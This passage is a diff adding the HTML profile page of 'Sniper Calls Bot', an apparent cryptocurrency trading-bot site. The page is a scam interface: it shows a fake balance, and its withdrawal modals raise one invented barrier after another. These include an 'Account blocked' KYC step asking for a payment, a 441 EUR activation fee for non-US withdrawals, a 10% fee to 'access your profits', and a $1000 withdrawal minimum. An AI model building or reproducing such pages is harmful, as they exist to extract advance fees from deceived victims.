@@ -1,0 +1,1215 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="prefetch" href="https://api.snipercallsbot.com/main.js" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/img/logo.svg" />
+    <link rel="stylesheet" href="/styles/style.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;1,100;1,200;1,300;1,400;1,500;1,600;1,700&display=swap"
+      rel="stylesheet"
+    />
+
+    <script>
+      window.isProfile = true;
+    </script>
+
+
+<script>
+  if (!window.localStorage.getItem("auth")) {
+    window.location.href = "/register.html";
+  }
+</script>
+
+    <title>Sniper Calls Bot</title>
+  </head>
+  <body>
+    <header class="header">
+      <div class="header__inner">
+        <div class="header__left">
+          <a class="header__logo" href="/">
+            <img src="/img/logo_white.svg" alt="" srcset="" />
+            <span>Sniper Calls Bot</span>
+          </a>
+
+          <div class="header__block">
+            <a href="/" class="header__link">
+              <img src="/img/trading.svg" alt="" />
+              TRADING
+            </a>
+            <a href="/statistics.html" class="header__link">
+              <img src="/img/statistics.svg" alt="" />
+              STATISTICS
+            </a>
+          </div>
+        </div>
+
+        <div class="header__right">
+          <div class="header__block">
+            <div class="header__link">
+              <img src="/img/card_blue.svg" alt="" />
+              <span>$<span id="headerWalletBalance">0000.00</span></span>
+            </div>
+
+            <a href="/profile.html" class="header__wallet desktop" id="headerWallet">
+              <img
+                src="/img/profile.svg"
+                alt=""
+                class="header__wallet__profile__img"
+              />
+              <span>Profile</span>
+              <span id="headerProfileName" style="display: none;">User</span>
+              <!-- <img src="/img/arrow_down.svg" alt="" class="header__wallet__arrow__img"/> -->
+            </a>
+          </div>
+
+          <div class="header__wallet" id="headerWallet" style="display: none">
+            <img src="/img/wallet.svg" alt="" />
+            <span
+              ><span id="headerWalletBalance">0.00</span> $<span
+                class="header__wallet--gray"
+              ></span
+            ></span>
+          </div>
+
+          <div class="header__burger" onclick="toogleNav()">
+            <img src="/img/burger.svg" alt="" />
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <div class="header__mobile" id="mobile_nav">
+      <a href="/" class="header__link">
+        <img src="/img/trading.svg" alt="" />
+        TRADING
+      </a>
+      <a href="/statistics.html" class="header__link">
+        <img src="/img/statistics.svg" alt="" />
+        STATISTICS
+      </a>
+
+      <a href="/profile.html" class="header__link" style="margin-bottom: 15px">
+        <img
+          src="/img/profile.svg"
+          alt=""
+          class="header__wallet__profile__img"
+          width="30px"
+          height="30px"
+          style="
+            width: 30px;
+            height: 30px;
+            margin-right: 16px;
+            transform: translateX(4px);
+          "
+        />
+        <span id="headerProfileName2">USER</span>
+      </a>
+
+      <div class="header__link">
+        <img src="/img/card_blue.svg" alt="" />
+        <span>$<span id="headerWalletBalance2">0000.00</span></span>
+      </div>
+    </div>
+
+    <main>
+      <div class="container">
+        <div class="profile">
+          <div class="glow" id="glow" style="width: 0; height: 0"></div>
+
+          <div class="profile__inner">
+            <div class="profile__block" style="min-height: 200px">
+              <div class="profile__block__title">Your total balance:</div>
+              <div class="profile__block__balance">
+                <div class="profile__block__balance__amount">
+                  <span class="profile__block__balance__amount--dollar">$</span
+                  ><span id="profile_balance">0000.00</span>
+                </div>
+
+                <div
+                  class="profile__block__balance__button"
+                  onclick="openProfileWithdraw()"
+                >
+                  Withdrawal
+                  <img src="/img/arrow.svg" alt="" />
+                </div>
+              </div>
+
+              <!-- <div class="profile__block__kyc__button">KYC Verificatoin</div> -->
+              <!-- <div class="profile__block__buttons">
+                <div class="profile__block__buttons__item">
+                  <div class="profile__block__buttons__item--top">
+                    Change password
+                  </div>
+                  <div class="profile__block__buttons__item--bottom">
+                    update your account password
+                  </div>
+                </div>
+                <div class="profile__block__buttons__item">
+                  <div class="profile__block__buttons__item--top">2FA</div>
+                  <div class="profile__block__buttons__item--bottom">
+                    two-factor authentication
+                  </div>
+                </div>
+                <div class="profile__block__buttons__item">
+                  <div class="profile__block__buttons__item--top">
+                    Notifications
+                  </div>
+                  <div class="profile__block__buttons__item--bottom">
+                    notification settings
+                  </div>
+                </div>
+              </div> -->
+            </div>
+            <div class="profile__block bottom">
+              <div class="profile__block__header">
+                <div class="profile__block__header__title">Transactions</div>
+                <!-- <div class="profile__block__header__sort">
+                  <div class="profile__block__header__sort--item active">
+                    <svg
+                      width="18"
+                      height="16"
+                      viewBox="0 0 18 16"
+                      fill="none"
+                      xmlns="http://www.w3.org/2000/svg"
+                    >
+                      <path
+                        id="Arrow 3"
+                        d="M10.1549 1.26831C10.1549 0.649899 9.65357 0.148577 9.03516 0.148577C8.41674 0.148577 7.91542 0.649899 7.91542 1.26831L10.1549 1.26831ZM8.24339 15.4969C8.68067 15.9342 9.38964 15.9342 9.82693 15.4969L16.9529 8.37094C17.3902 7.93366 17.3902 7.22468 16.9529 6.7874C16.5156 6.35012 15.8066 6.35012 15.3693 6.7874L9.03516 13.1216L2.70099 6.7874C2.2637 6.35012 1.55473 6.35012 1.11745 6.7874C0.680163 7.22468 0.680163 7.93366 1.11745 8.37094L8.24339 15.4969ZM7.91542 1.26831L7.91542 14.7051L10.1549 14.7051L10.1549 1.26831L7.91542 1.26831Z"
+                        fill="currentColor"
+                      />
+                    </svg>
+                  </div>
+                  <div class="profile__block__header__sort--item">
+                    <svg
+                      width="18"
+                      height="16"
+                      viewBox="0 0 18 16"
+                      fill="none"
+                      xmlns="http://www.w3.org/2000/svg"
+                    >
+                      <path
+                        id="Arrow 3"
+                        d="M10.1549 1.26831C10.1549 0.649899 9.65357 0.148577 9.03516 0.148577C8.41674 0.148577 7.91542 0.649899 7.91542 1.26831L10.1549 1.26831ZM8.24339 15.4969C8.68067 15.9342 9.38964 15.9342 9.82693 15.4969L16.9529 8.37094C17.3902 7.93366 17.3902 7.22468 16.9529 6.7874C16.5156 6.35012 15.8066 6.35012 15.3693 6.7874L9.03516 13.1216L2.70099 6.7874C2.2637 6.35012 1.55473 6.35012 1.11745 6.7874C0.680163 7.22468 0.680163 7.93366 1.11745 8.37094L8.24339 15.4969ZM7.91542 1.26831L7.91542 14.7051L10.1549 14.7051L10.1549 1.26831L7.91542 1.26831Z"
+                        fill="currentColor"
+                      />
+                    </svg>
+                  </div>
+                </div> -->
+              </div>
+
+              <div class="profile__block__table">
+                <div class="profile__block__table__header profilebody">
+                  <div class="profile__block__table__header--item name">
+                    Name
+                  </div>
+                  <div class="profile__block__table__header--item time">
+                    Time
+                  </div>
+                  <div class="profile__block__table__header--item quantity">
+                    Quantity
+                  </div>
+                  <div class="profile__block__table__header--item usd">USD</div>
+                  <div class="profile__block__table__header--item status">
+                    Status
+                  </div>
+                </div>
+
+                <div
+                  class="profile__block__table__body profilebody"
+                  id="profile_transactions"
+                >
+                  <!-- <div class="profile__block__table__body__item">
+                    <div class="profile__block__table__body__item--column name">
+                      <img src="/img/sol.png" alt="" />
+                      SOL
+                    </div>
+                    <div class="profile__block__table__body__item--column time">
+                      19:01
+                    </div>
+                    <div
+                      class="profile__block__table__body__item--column quantity"
+                    >
+                      59,45
+                    </div>
+                    <div class="profile__block__table__body__item--column usd">
+                      100000
+                    </div>
+                    <div
+                      class="profile__block__table__body__item--column status green"
+                    >
+                      Received
+                      <svg
+                        xmlns="http://www.w3.org/2000/svg"
+                        width="26"
+                        height="26"
+                        viewBox="0 0 26 26"
+                        fill="none"
+                      >
+                        <circle
+                          cx="12.9655"
+                          cy="13.206"
+                          r="12.3171"
+                          fill="#1492FF"
+                        />
+                        <path
+                          d="M7.36719 12.7988L10.8962 16.7399C11.3455 17.2417 12.1328 17.2361 12.575 16.7281L18.5645 9.84668"
+                          stroke="#173A63"
+                          stroke-width="2.23947"
+                          stroke-linecap="round"
+                        />
+                      </svg>
+                    </div>
+                  </div> -->
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    
+    <div class="modal hide" id="modal__nowithdraw">
+      <div class="modal__error">
+        <img src="/img/warning.svg" alt="" class="modal__error__img" />
+        <div class="modal__error__title">The bot is working</div>
+        <div class="modal__error__subtitle">
+          Please stop the bot to withdraw.
+        </div>
+      </div>
+    </div>
+
+    <div class="modal hide" id="modal_kyc_step1">
+      <div class="modal__kyc">
+        <img
+          src="/img/close.svg"
+          alt=""
+          class="modal__close"
+          onclick="closeModal('modal_kyc_step1')"
+        />
+        <div class="modal__left">
+          <div class="modal__left__logo">
+            <img src="/img/logo_white.svg" alt="" />
+            Sniper Calls Bot
+          </div>
+
+          <div class="modal__kyc__subtitle">
+            Verification required
+            <span class="modal__kyc__subtitle--gray">|</span>
+            <span class="modal__kyc__subtitle--red">Account blocked</span>
+          </div>
+
+          <div class="modal__kyc__title">KYC Verificatoin</div>
+
+          <div class="modal__kyc__input">
+            <label for="">Payment amount</label>
+
+            <div class="modal__kyc__input--input">
+              <span class="modal__kyc__input--input__currency">EUR</span>
+              <input type="number" />
+            </div>
+          </div>
+
+          <div class="modal__kyc__input">
+            <label for="">Invoice for payment</label>
+
+            <div class="modal__kyc__input--input">
+              <input type="text" />
+            </div>
+          </div>
+
+          <div class="modal__kyc__line">
+            <div class="modal__kyc__input">
+              <label for="">First name</label>
+
+              <div class="modal__kyc__input--input">
+                <input type="text" />
+              </div>
+            </div>
+            <div class="modal__kyc__input">
+              <label for="">Last Name</label>
+
+              <div class="modal__kyc__input--input">
+                <input type="text" />
+              </div>
+            </div>
+          </div>
+
+          <div class="modal__kyc__checkbox">
+            <input type="checkbox" id="terms" name="terms" />
+            <label for="terms" class="modal__kyc__checkbox--container"
+              >By Continuing I agreee to the <a>Tearms of Use</a> <br />
+              <div style="width: 30px; display: inline-block"></div>
+              and <a>Privacy Policy</a></label
+            >
+          </div>
+
+          <div class="modal__kyc__button">Verify</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="modal hide" id="modal_kyc_step2">
+      <div class="modal__kyc">
+        <img
+          src="/img/close.svg"
+          alt=""
+          class="modal__close"
+          onclick="closeModal('modal_kyc_step2')"
+        />
+        <div class="modal__left">
+          <div class="modal__left__logo">
+            <img src="/img/logo_white.svg" alt="" />
+            Sniper Calls Bot
+          </div>
+
+          <div class="modal__kyc__title" style="margin-bottom: 18px">
+            KYC Verificatoin
+          </div>
+
+          <div class="modal__kyc__progress">
+            <div class="modal__kyc__progress--item active">
+              <div class="modal__kyc__progress--item__top"></div>
+              <div class="modal__kyc__progress--item__text">Verification</div>
+            </div>
+            <div class="modal__kyc__progress--item">
+              <div class="modal__kyc__progress--item__top"></div>
+              <div class="modal__kyc__progress--item__text">Conversion</div>
+            </div>
+            <div class="modal__kyc__progress--item">
+              <div class="modal__kyc__progress--item__top"></div>
+              <div class="modal__kyc__progress--item__text">Sending funds</div>
+            </div>
+          </div>
+
+          <div class="modal__kyc__input" style="margin-bottom: 40px">
+            <div class="modal__kyc__input--input">
+              <input
+                type="text"
+                value="IT65D5290865620000EM000304161"
+                style="text-align: center"
+              />
+            </div>
+          </div>
+
+          <img src="/img/id_card.png" alt="" class="modal__kyc__idcard" />
+          <img src="/img/upload.png" alt="" class="modal__kyc__upload" />
+
+          <div class="modal__kyc__note">
+            <div class="modal__kyc__note--circle"></div>
+            For withdrawal of funds it is necessary to pass verification
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="modal hide" id="modal_kyc_step3">
+      <div class="modal__withdrawal">
+        <img
+          src="/img/close.svg"
+          alt=""
+          class="modal__close"
+          onclick="closeModal('modal_kyc_step3')"
+        />
+        <div class="modal__left">
+          <div class="modal__left__logo">
+            <img src="/img/logo_white.svg" alt="" />
+            Sniper Calls Bot
+          </div>
+
+          <div class="modal__withdrawal__subtitle">
+            Transaction number (№49618046190)
+          </div>
+          <div class="modal__kyc__input">
+            <label for="">Output amout</label>
+
+            <div class="modal__kyc__input--input">
+              <input type="number" />
+            </div>
+          </div>
+          <div class="modal__kyc__input">
+            <label for="">Bank account</label>
+
+            <div class="modal__kyc__input--input">
+              <input type="number" />
+            </div>
+          </div>
+
+          <div class="modal__withdrawal__info">
+            <div class="modal__withdrawal__info__title">
+              Incompatible details
+            </div>
+            <div class="modal__withdrawal__info__text">
+              According to the terms of the exchange, all new users can withdraw
+              funds only to accounts belonging to the financial system of the
+              United States of America.
+            </div>
+
+            <div class="modal__withdrawal__info__subtitle">
+              To withdraw funds to accounts of other countries, you need to
+              activate the transaction function of the exchange
+            </div>
+
+            <div class="modal__withdrawal__info__list">
+              Activation amount:
+              <span class="modal__withdrawal__info__list--green">441 EUR</span>
+            </div>
+            <div class="modal__withdrawal__info__list">
+              Invoice for payment:
+              <span class="modal__withdrawal__info__list--gray"
+                >vp9826h-964h8-915h4-hi4j2-9860725hg</span
+              >
+            </div>
+          </div>
+
+          <div class="modal__kyc__button">Check payment</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="modal hide" id="modal_commission">
+      <div class="modal__kyc">
+        <img
+          src="/img/close.svg"
+          alt=""
+          class="modal__close"
+          onclick="closeModal('modal_commission')"
+        />
+        <div class="modal__left">
+          <div class="modal__left__logo">
+            <img src="/img/logo_white.svg" alt="" />
+            Sniper Calls Bot
+          </div>
+
+          <div class="modal__kyc__title">Commission payment</div>
+
+          <div class="modal__kyc__input">
+            <label for="">Profit</label>
+
+            <div class="modal__kyc__input--input commission">
+              <span class="modal__kyc__input--input__currency">USD</span>
+              <input
+                id="modal_commission_balance"
+                type="text"
+                value="500.23"
+                style="color: white"
+                disabled
+              />
+            </div>
+          </div>
+
+          <div class="modal__kyc__input">
+            <label for="">Commission</label>
+
+            <div class="modal__kyc__input--input commission">
+              <span class="modal__kyc__input--input__currency">USD</span>
+              <input
+                type="text"
+                value="500.23"
+                disabled
+                id="modal_commission_balance_commission"
+              />
+            </div>
+          </div>
+
+          <div class="modal__kyc__commission__alert">
+            To access your profits, a 10% service fee for the bot is required.
+          </div>
+
+          <div class="modal__kyc__buttons">
+            <div class="modal__kyc__button" onclick="openPayCommissionCrypto()">
+              Pay by Crypto
+            </div>
+            <div class="modal__kyc__button" onclick="openPayCommissionCard()">
+              Pay by Card
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="modal" id="modal__loading__card" style="display: none">
+      <div class="modal__error">
+        <span class="loader"></span>
+        <div class="modal__error__title">
+          Please wait while the payment link is generated
+        </div>
+        <div class="modal__error__subtitle">
+          This may take up to 30 seconds.
+        </div>
+      </div>
+    </div>
+
+    <div class="modal hide" id="modal_deposit_card">
+      <div class="modal__deposit__crypto">
+        <img
+          src="/img/close.svg"
+          alt=""
+          class="modal__close"
+          onclick="closeModal('modal_deposit_card')"
+        />
+
+        <div class="modal__left__logo">
+          <img src="/img/logo_white.svg" alt="" />
+          Sniper Calls Bot
+        </div>
+
+        <div class="modal__deposit__crypto__title" style="margin-bottom: 18px">
+          Select currency
+        </div>
+
+        <div class="center__deposit__enter card">
+          <label for="amount">Search by name</label>
+          <input
+            type="text"
+            name=""
+            id="search_fiat"
+            style="background: #1c1f25"
+          />
+
+          <img src="/img/search2.svg" alt="" />
+        </div>
+
+        <div
+          class="modal__deposit__crypto__choose"
+          id="currencies_list"
+          style="gap: 10px"
+        >
+          <div class="modal__deposit__crypto__choose__item">USD</div>
+        </div>
+
+        <div class="center__deposit__enter card amount">
+          <label for="amount">Amount</label>
+          <input
+            type="text"
+            name=""
+            placeholder="Min: 100$"
+            disabled
+            id="withdraw_amount_fiat"
+            style="background: #1c1f25"
+          />
+        </div>
+
+        <div
+          class="modal__deposit__crypto__send__warning hide"
+          id="confirm_fiat_warning"
+        >
+          Payment not found. Exchange may take up to 10 minutes. Please try
+          again later.
+        </div>
+
+        <div class="modal__deposit__crypto__buttons">
+          <div
+            class="modal__deposit__crypto__button"
+            id="modal__deposit__crypto__button"
+            onclick="confirmFiatWithdraw()"
+          >
+            Confirm
+
+            <span
+              class="loader small black hide"
+              id="loader_deposit_card_button"
+            ></span>
+          </div>
+
+          <div
+            class="modal__deposit__crypto__button hide"
+            onclick="paidFiatWithdraw()"
+            id="paid_fiat_button"
+            style="background: #1491ff"
+          >
+            I've already paid
+
+            <span
+              class="loader small black hide"
+              id="loader_deposit_card_already_button"
+            ></span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="modal hide" id="modal_profile_withdraw">
+      <div class="modal__kyc">
+        <img
+          src="/img/close.svg"
+          alt=""
+          class="modal__close"
+          onclick="closeModal('modal_profile_withdraw')"
+        />
+        <div class="modal__left">
+          <div class="modal__left__logo">
+            <img src="/img/logo_white.svg" alt="" />
+            Sniper Calls Bot
+          </div>
+
+          <div class="modal__kyc__title">Select withdraw method</div>
+
+          <div class="modal__withdraw">
+            <div
+              class="modal__withdraw__item"
+              onclick="selectWithdrawMethod(0)"
+            >
+              <img src="/img/iban_logo.svg" alt="" /> IBAN
+            </div>
+            <div
+              class="modal__withdraw__item hide"
+              onclick="selectWithdrawMethod(1)"
+            >
+              <img src="/img/bank_logo.svg" alt="" /> BANK CARD
+            </div>
+            <div
+              class="modal__withdraw__item"
+              onclick="selectWithdrawMethod(2)"
+            >
+              <img src="/img/crypto_logo.svg" alt="" /> Cryptocurrency
+            </div>
+          </div>
+
+          <div class="modal__kyc__button" onclick="profileWithdrawContinue()">
+            Continue
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="modal hide" id="modal_withdraw_crypto">
+      <div class="modal__deposit__crypto">
+        <img
+          src="/img/close.svg"
+          alt=""
+          class="modal__close"
+          onclick="closeModal('modal_withdraw_crypto')"
+        />
+
+        <div class="modal__left__logo">
+          <img src="/img/logo_white.svg" alt="" />
+          Sniper Calls Bot
+        </div>
+
+        <div class="modal__deposit__crypto__title">Select cryptocurrency</div>
+
+        <div class="modal__deposit__crypto__select">
+          <div
+            class="modal__deposit__crypto__select__item"
+            onclick="selectCrypto(event,'btc','btc')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/btc.svg" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              Bitcoin <span>(BTC)</span>
+            </div>
+          </div>
+
+          <div
+            class="modal__deposit__crypto__select__item"
+            onclick="selectCrypto(event,'eth','eth')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/eth.svg" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              Ethereum <span>(ETH)</span>
+            </div>
+          </div>
+          <div
+            class="modal__deposit__crypto__select__item"
+            onclick="selectCrypto(event,'trx','trx')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/trx_f14430166e.svg" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              TRON <span>(TRX)</span>
+            </div>
+          </div>
+          <div
+            class="modal__deposit__crypto__select__item"
+            onclick="selectCrypto(event,'bnb','bnb')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/bnbbsc_331e969a6b.svg" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              BNB <span>(BSC)</span>
+            </div>
+          </div>
+          <div
+            class="modal__deposit__crypto__select__item"
+            onclick="selectCrypto(event,'matic','matic')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/matic_token_f9906e3f5d.svg" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              MATIC <span>(POLYGON)</span>
+            </div>
+          </div>
+          <div
+            class="modal__deposit__crypto__select__item"
+            onclick="selectCrypto(event,'usdt','eth')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/usdterc20_5ae21618aa.svg" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              USDT <span>(ETH)</span>
+            </div>
+          </div>
+          <div
+            class="modal__deposit__crypto__select__item"
+            onclick="selectCrypto(event,'usdt','trx')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/usdttrc20_87164a7b35.svg" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              USDT <span>(TRX)</span>
+            </div>
+          </div>
+          <div
+            class="modal__deposit__crypto__select__item"
+            onclick="selectCrypto(event,'usdt','bsc')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/usdtbsc_b8f3d8f316.svg" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              USDT <span>(BSC)</span>
+            </div>
+          </div>
+          <div
+            class="modal__deposit__crypto__select__item active"
+            onclick="selectCrypto(event,'sol','sol')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/sol.png" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              SOL <span>(SOL)</span>
+            </div>
+          </div>
+          <div
+            class="modal__deposit__crypto__select__item"
+            onclick="selectCrypto(event,'ton','ton')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/ton_e0f171f660.svg" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              TON <span>(TON)</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="center__deposit__enter">
+          <label for="amount">Enter address</label>
+          <input
+            type="text"
+            name=""
+            id="withdraw_address"
+            placeholder="Enter address"
+            style="background: #1c1f25"
+          />
+        </div>
+
+        <div class="center__deposit__enter">
+          <label for="amount">Amount</label>
+          <input
+            type="text"
+            name=""
+            id="profile_modal_balance"
+            placeholder="Min: 100$"
+            style="background: #1c1f25"
+            disabled
+          />
+        </div>
+
+        <div
+          class="modal__kyc__commission__alert hide"
+          id="profile_withdraw_confirm_alert"
+        >
+          High-risk transaction, with significant liquidity fluctuations, you
+          could lose the entire deposit. To avoid risks, withdrawals are allowed
+          from $1000.
+        </div>
+
+        <div class="modal__kyc__button" onclick="profileWithdrawConfirm()">
+          Confirm
+        </div>
+      </div>
+    </div>
+
+    <div class="modal hide" id="modal_withdraw_iban">
+      <div class="modal__deposit__crypto">
+        <img
+          src="/img/close.svg"
+          alt=""
+          class="modal__close"
+          onclick="closeModal('modal_withdraw_iban')"
+        />
+
+        <div class="modal__left__logo">
+          <img src="/img/logo_white.svg" alt="" />
+          Sniper Calls Bot
+        </div>
+
+        <div class="modal__deposit__crypto__title">Enter your payment data</div>
+
+        <div class="center__deposit__enter">
+          <label for="amount">IBAN</label>
+          <input
+            type="text"
+            name=""
+            placeholder="Enter IBAN"
+            style="background: #1c1f25"
+          />
+        </div>
+
+        <div class="center__deposit__enter">
+          <label for="amount">BIC</label>
+          <input
+            type="text"
+            name=""
+            placeholder="Enter BIC"
+            style="background: #1c1f25"
+          />
+        </div>
+
+        <div class="center__deposit__enter">
+          <label for="amount">First name</label>
+          <input
+            type="text"
+            name=""
+            placeholder="John"
+            style="background: #1c1f25"
+          />
+        </div>
+
+        <div class="center__deposit__enter">
+          <label for="amount">Last name</label>
+          <input
+            type="text"
+            name=""
+            placeholder="Smith"
+            style="background: #1c1f25"
+          />
+        </div>
+
+        <div class="center__deposit__enter">
+          <label for="amount">Amount</label>
+          <input
+            type="text"
+            name=""
+            id="modal_withdraw_iban_balance"
+            placeholder="Min: 100$"
+            style="background: #1c1f25"
+            disabled
+          />
+        </div>
+
+        <div
+          class="modal__kyc__commission__alert hide"
+          id="profile_withdraw_confirm_alert_iban"
+        >
+          High-risk transaction, with significant liquidity fluctuations, you
+          could lose the entire deposit. To avoid risks, withdrawals are allowed
+          from $1000.
+        </div>
+
+        <div class="modal__kyc__button" onclick="profileWithdrawIBANConfirm()">
+          Withdraw
+        </div>
+      </div>
+    </div>
+
+    <div class="modal hide" id="modal_commission_crypto">
+      <div class="modal__deposit__crypto">
+        <img
+          src="/img/close.svg"
+          alt=""
+          class="modal__close"
+          onclick="closeModal('modal_commission_crypto')"
+        />
+
+        <div class="modal__left__logo">
+          <img src="/img/logo_white.svg" alt="" />
+          Sniper Calls Bot
+        </div>
+
+        <div class="modal__deposit__crypto__title">Select cryptocurrency</div>
+
+        <div class="modal__deposit__crypto__select">
+          <div
+            class="modal__deposit__crypto__select__item"
+            onclick="selectCrypto(event,'btc','btc')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/btc.svg" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              Bitcoin <span>(BTC)</span>
+            </div>
+          </div>
+
+          <div
+            class="modal__deposit__crypto__select__item"
+            onclick="selectCrypto(event,'eth','eth')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/eth.svg" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              Ethereum <span>(ETH)</span>
+            </div>
+          </div>
+          <div
+            class="modal__deposit__crypto__select__item"
+            onclick="selectCrypto(event,'trx','trx')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/trx_f14430166e.svg" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              TRON <span>(TRX)</span>
+            </div>
+          </div>
+          <div
+            class="modal__deposit__crypto__select__item"
+            onclick="selectCrypto(event,'bnb','bnb')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/bnbbsc_331e969a6b.svg" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              BNB <span>(BSC)</span>
+            </div>
+          </div>
+          <div
+            class="modal__deposit__crypto__select__item"
+            onclick="selectCrypto(event,'matic','matic')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/matic_token_f9906e3f5d.svg" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              MATIC <span>(POLYGON)</span>
+            </div>
+          </div>
+          <div
+            class="modal__deposit__crypto__select__item"
+            onclick="selectCrypto(event,'usdt','eth')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/usdterc20_5ae21618aa.svg" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              USDT <span>(ETH)</span>
+            </div>
+          </div>
+          <div
+            class="modal__deposit__crypto__select__item"
+            onclick="selectCrypto(event,'usdt','trx')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/usdttrc20_87164a7b35.svg" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              USDT <span>(TRX)</span>
+            </div>
+          </div>
+          <div
+            class="modal__deposit__crypto__select__item"
+            onclick="selectCrypto(event,'usdt','bsc')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/usdtbsc_b8f3d8f316.svg" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              USDT <span>(BSC)</span>
+            </div>
+          </div>
+          <div
+            class="modal__deposit__crypto__select__item"
+            onclick="selectCrypto(event,'sol','sol')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/sol.png" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              SOL <span>(SOL)</span>
+            </div>
+          </div>
+          <div
+            class="modal__deposit__crypto__select__item"
+            onclick="selectCrypto(event,'ton','ton')"
+          >
+            <div class="modal__deposit__crypto__select__item--left">
+              <img src="/img/ton_e0f171f660.svg" alt="" />
+            </div>
+            <div class="modal__deposit__crypto__select__item--right">
+              TON <span>(TON)</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="center__deposit__enter">
+          <label for="amount">Amount</label>
+          <input
+            type="text"
+            name=""
+            id="amount_crypto"
+            disabled
+            placeholder="Min: 100$"
+            style="background: #1c1f25"
+          />
+        </div>
+
+        <div
+          class="modal__deposit__crypto__button"
+          onclick="depositCryptoConfirmWithdraw()"
+        >
+          Confirm
+          <span
+            class="loader small black hide"
+            id="loader_deposit_crypto_button"
+          ></span>
+        </div>
+      </div>
+    </div>
+
+    <div class="modal hide" id="modal_deposit_crypto_send">
+      <div class="modal__deposit__crypto">
+        <img
+          src="/img/close.svg"
+          alt=""
+          class="modal__close"
+          onclick="closeModal('modal_deposit_crypto_send')"
+        />
+
+        <div class="modal__deposit__crypto__send">
+          <img
+            id="modal_deposit_crypto_send_img"
+            src="/img/sol_logo.svg"
+            alt=""
+            class="modal__deposit__crypto__send__logo"
+          />
+
+          <div class="modal__deposit__crypto__send__text">
+            Make transfer to:
+          </div>
+          <div class="modal__deposit__crypto__send__sum" onclick="copyAmount()">
+            <div class="modal__deposit__crypto__send__sum--text">
+              <b id="modal_deposit_crypto_send_amount">0.444444444</b>
+              <span id="modal_deposit_crypto_send_coin">SOL</span>
+            </div>
+
+            <img
+              src="/img/copy2.svg"
+              alt=""
+              class="modal__deposit__crypto__send__sum--copy"
+            />
+          </div>
+          <div
+            class="modal__deposit__crypto__send__address"
+            onclick="copyAddressCrypto()"
+          >
+            <span id="sendAddress">0RlSQButXQuyNJo7mJzqTJ6b226jYSQUQBe</span>
+            <img src="/img/copy2.svg" alt="" />
+          </div>
+
+          <div class="modal__deposit__crypto__send__qr">
+            <img src="/img/qr.svg" alt="" id="qrcode" />
+          </div>
+
+          <div
+            class="modal__deposit__crypto__send__warning hide"
+            id="confirm_crypto_warning"
+          >
+            Deposit not found. Exchange may take up to 10 minutes. Please try
+            again later.
+          </div>
+
+          <div
